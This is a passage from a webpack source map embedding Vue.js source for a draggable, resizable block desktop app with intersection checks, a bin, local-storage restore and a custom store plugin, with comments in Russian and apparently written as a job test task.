console.log(`b1: ${b1.id}, posX: ${b1.posX}, sizeX: ${b1.sizeX}`)\r\n            console.log(`b2: ${b2.id}, posX: ${b2.posX}, sizeX: ${b2.sizeX}`)\r\n\r\n            /**\r\n             * Чтобы нормально написать код ниже требуется дополнительное время.\r\n             * В рамках тестового задания не буду это делать.\r\n             * Уже итак много всего сделано для бесплатного тестового.\r\n             */\r\n            let dir = Math.abs(upd.x) - Math.abs(upd.y)\r\n            if (['move', null].includes(b1.action)) {\r\n                if (dir <= 0) {\r\n                    let before = b1.posX\r\n                    b1.posX += upd.x\r\n                    console.log('MOVE x', before, b1.posX)\r\n                }\r\n                else if (dir > 0) {\r\n                    let before = b1.posY\r\n                    b1.posY += upd.y\r\n                    console.log('MOVE y', before, b1.posY)\r\n                }\r\n            } else if (['resize'].includes(b1.action)) {\r\n                let sizedX = false\r\n                if (b1.end.x >= this.sizeX - this.between * 2) {\r\n                    b1.posX = b2.end.x + this.between\r\n                    b1.sizeX = this.sizeX - b1.posX - this.between\r\n                    console.log('RIGHT!')\r\n                    // b1.actionEnd()\r\n                    sizedX = true\r\n                } \r\n                if (b1.posX <= this.between) {\r\n                    b1.posX = this.between\r\n                    b1.sizeX = b2.posX - this.between * 2\r\n                    console.log('LEFT!', b1.start.x, b2.start.x)\r\n                    // b1.actionEnd()\r\n                    sizedX = true\r\n                }\r\n                if (!sizedX && dir < 0) {\r\n                    let before = b1.sizeX\r\n                    b1.sizeX += upd.x\r\n                    console.log('RESIZE x', before, b1.sizeX)\r\n                }\r\n\r\n                let sizedY = false\r\n                if (b1.end.y >= this.sizeY - this.between * 2) {\r\n                    b1.posY = b2.end.y + this.between\r\n                    b1.sizeY = this.sizeY - b1.posY - this.between\r\n                    console.log('BOTTOM!')\r\n                    // b1.actionEnd()\r\n                    sizedY = true\r\n                } \r\n                if (b1.posY <= this.between) {\r\n                    b1.posY = this.between\r\n                    b1.sizeY = b2.posY - this.between * 2\r\n                    console.log('TOP!')\r\n                    // b1.actionEnd()\r\n                    sizedY = true\r\n                }\r\n                \r\n                if (!sizedY && dir > 0) {\r\n                    let before = b1.sizeY\r\n                    b1.sizeY += upd.y\r\n                    console.log('RESIZE y', before, b1.sizeY)\r\n                }\r\n                \r\n                // if (!sized) b1.rollbackAction()\r\n                // b1.action = null\r\n                // b1.actionEnd()\r\n            }\r\n        }\r\n    }\r\n\r\n    // stopDesktopResizeIntersecting(b1, b2) {\r\n    //     let between_x2 = this.between * 2\r\n    //     let x = true, y = true\r\n    //     if (b1.end.x >= this.sizeX - between_x2) {\r\n    //         b1.posX = b2.end.x + this.between\r\n    //         b1.sizeX = this.sizeX - b1.posX - this.between\r\n    //         console.log('RIGHT!')\r\n    //     } else if (b1.posX <= this.between) {\r\n    //         b1.posX = this.between\r\n    //         b1.sizeX = b2.posX - between_x2\r\n    //         console.log('LEFT!')\r\n    //     } else x = false\r\n\r\n    //     if (b1.end.y >= this.sizeY - between_x2) {\r\n    //         b1.posY = b2.end.y + this.between\r\n    //         b1.sizeY = this.sizeY - b1.posY - this.between\r\n    //         console.log('BOTTOM!')\r\n    //     } else if (b1.posY <= this.between) {\r\n    //         b1.posY = this.between\r\n    //         b1.sizeY = b2.posY - between_x2\r\n    //         console.log('TOP!')\r\n    //     } else y = false\r\n    //     return [x, y]\r\n    // }\r\n\r\n    // проверка перечечений блока\r\n    intersectCheck(b1) {\r\n        this.keepOnDesktop(b1)\r\n        if (this.removeIfIntersectBin(b1)) return\r\n        this.each(b2 => {\r\n            if (b1.id == b2.id || b1.intersecting && b2.intersecting) return\r\n            this.stopIntersecting(b1, b2)\r\n        })\r\n    }\r\n\r\n    // проверка пересечений блоков\r\n    intersectCheckAll() {\r\n        this.each(b1 => {\r\n            this.keepOnDesktop(b1)\r\n            if (this.removeIfIntersectBin(b1)) return\r\n            this.each(b2 => {\r\n                if (b1.id == b2.id || b1.intersecting && b2.intersecting) return\r\n                this.stopIntersecting(b1, b2)\r\n            })\r\n        })\r\n    }\r\n\r\n    // проверка пересений блока при завершении движений или ресайза\r\n    intersectEndCheck(b1) {\r\n        this.keepOnDesktop(b1)\r\n        if (this.removeIfIntersectBin(b1)) return\r\n        for (let b2 of this.models) {\r\n            if (b1.id == b2.id || b1.intersecting && b2.intersecting) continue\r\n            if (this.intersect(b1, b2)[0]) b1.rollbackAction()\r\n        }\r\n    }\r\n\r\n    // оставляем блок на столе\r\n    keepOnDesktop(b1) { \r\n        // проверяем размеры\r\n        let between_x2 = this.between * 2\r\n        if (b1.sizeX + between_x2 > this.sizeX) b1.sizeX = this.sizeX - between_x2\r\n        if (b1.sizeY + between_x2 > this.sizeY) b1.sizeY = this.sizeY - between_x2\r\n        // проверяем позицию\r\n        if (b1.start.x < 0) b1.posX = this.between\r\n        if (b1.start.y < 0) b1.posY = this.between\r\n        if (b1.end.x > this.sizeX) b1.posX = this.sizeX - b1.sizeX - this.between\r\n        if (b1.end.y > this.sizeY) b1.posY = this.sizeY - b1.sizeY - this.between\r\n    }\r\n\r\n    // удаляем блок в корзину, если он соприкоснулся с корзиной\r\n    removeIfIntersectBin(b1) {\r\n        let [intersect] = this.intersect(b1, this.bin)\r\n        if (intersect) b1.remove()\r\n        return intersect\r\n    }\r\n\r\n\r\n    // logCoord(coord) { return `(x:${coord.x}, y:${coord.y})` }\r\n    // logCoords(name, elem) {\r\n    //     return `${name}: A${this.logCoord(elem.start)} -> B${this.logCoord(elem.end)}`\r\n    // }\r\n\r\n    init() {\r\n        console.log('INIT!')\r\n        // this.localStore.reset()\r\n        let blocks = this.localStore.blocks\r\n        if (blocks && blocks.length > 0) {\r\n            console.log('RESTORE START', blocks)\r\n            blocks.forEach(block => {\r\n                let b = this.add(block)\r\n                if ('bin' == b.action) {\r\n                    b.action = null\r\n                    b.remove(false)\r\n                }\r\n            })\r\n            this.history.restore()\r\n            console.log(`RESTORE END. Desk: ${this.size()} Bin: ${this.bin.size()}`)\r\n        } else {\r\n            this.add(this.defaultBlocks())\r\n            this.history.initial()\r\n            console.log('INITIAL')\r\n        }\r\n    }\r\n\r\n    defaultBlocks() {\r\n        return mock.desktop.blocks\r\n    }\r\n\r\n    defaultBlockById(id) {\r\n        return this.defaultBlocks().find(block => block.id == id)\r\n    }\r\n\r\n    reset() {\r\n        console.log('RESET START')\r\n        this.bin.restoreAll()\r\n        this.each(block => {\r\n            let def = this.defaultBlockById(block.id)\r\n            if (!def) return\r\n            for (let key in def) block[key] = def[key]\r\n            block.historyReset()\r\n        })\r\n        this.history.reset()\r\n        this.localStore.reset()\r\n        this.history.initial()\r\n        console.log('RESET END', this.size(), this.bin.size())\r\n    }\r\n}\r\n","import Store from '../core/Store'\r\nimport Desktop from './Desktop'\r\n\r\nconst desktop = new Desktop\r\ndesktop.init()\r\n\r\nexport default new Store({ desktop })\r\n","import Vue from 'vue'\r\nimport App from './App.vue'\r\nimport router from './router'\r\n\r\nVue.config.productionTip = false\r\n\r\n// добавление своего стора\r\nimport Plugin from './core/Plugin'\r\nimport store from './store/store'\r\nVue.use(new Plugin('store', store))\r\n\r\nnew Vue({\r\n  store,\r\n  router,\r\n  render: h => h(App)\r\n}).$mount('#app')\r\n","export * from \"-!../../../node_modules/mini-css-extract-plugin/dist/loader.js??ref--6-oneOf-1-0!../../../node_modules/css-loader/dist/cjs.js??ref--6-oneOf-1-1!../../../node_modules/vue-loader/lib/loaders/stylePostLoader.js!../../../node_modules/postcss-loader/src/index.js??ref--6-oneOf-1-2!../../../node_modules/cache-loader/dist/cjs.js??ref--0-0!../../../node_modules/vue-loader/lib/index.js??vue-loader-options!./Block.vue?vue&type=style&index=0&lang=css&\""],"sourceRoot":""}